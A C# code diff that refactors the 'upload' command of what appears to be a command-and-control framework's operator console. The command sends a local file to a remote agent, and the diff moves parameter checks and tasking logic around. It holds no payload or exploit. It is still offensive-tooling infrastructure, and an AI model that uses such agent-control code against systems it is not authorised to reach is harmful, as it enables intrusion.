@@ -1,5 +1,5 @@
-﻿using ApiModels.Response;
-using Commander.Executor;
+﻿using Commander.Executor;
+using Shared;
 using System;
 using System.Collections.Generic;
 using System.CommandLine;
@@ -21,25 +21,33 @@ namespace Commander.Commands.Agent
         public override string Category => CommandCategory.Network;
         public override string Description => "Upload a file to the agent";
         public override string Name => "upload";
+
+
+        public override CommandId CommandId => CommandId.Upload;
         public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
 
         public override RootCommand Command => new RootCommand(this.Description)
             {
-                new Argument<string>( "localFile", "local file name to be uploaded to the agent."),
-                new Argument<string>("remotefile", () => string.Empty, "name of the file to be saved on the agent"),
+                new Argument<string>("localFile", "local file path to be uploaded to the agent."),
+                new Argument<string>("remotefile", () => string.Empty, "path of the file to be saved on the agent"),
             };
 
-        protected async override Task<bool> HandleCommand(CommandContext<UploadCommandoptions> context)
+        protected override async Task<bool> CheckParams(CommandContext<UploadCommandoptions> context)
+        {
+            if (!File.Exists(context.Options.localfile))
+            {
+                context.Terminal.WriteError($"File {context.Options.localfile} does not exists!");
+                return false;
+            }
+            return await base.CheckParams(context);
+        }
+
+
+        protected override void SpecifyParameters(CommandContext<UploadCommandoptions> context)
         {
             var path = context.Options.localfile;
             var filename = Path.GetFileName(path);
-            if (!File.Exists(path))
-            {
-                context.Terminal.WriteError($"File {filename} does not exists!");
-                return false;
-            }
-
-
+            
             byte[] fileBytes = null;
             using (FileStream fs = File.OpenRead(path))
             {
@@ -52,15 +60,9 @@ namespace Commander.Commands.Agent
                 filename = context.Options.remotefile;
             }
 
-            context.Terminal.WriteLine($"Preparing to upload the file...");
+            context.AddParameter(ParameterId.Name, filename);
+            context.AddParameter(ParameterId.File, fileBytes);
 
-            var fileId = await context.UploadAndDisplay(fileBytes, filename);
-
-            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, EndPointCommand.DOWNLOAD, fileId, filename);
-           
-            context.Terminal.WriteInfo($"File uploaded to the server, agent tasked to download the file.");
-
-            return true;
         }
     }
 }
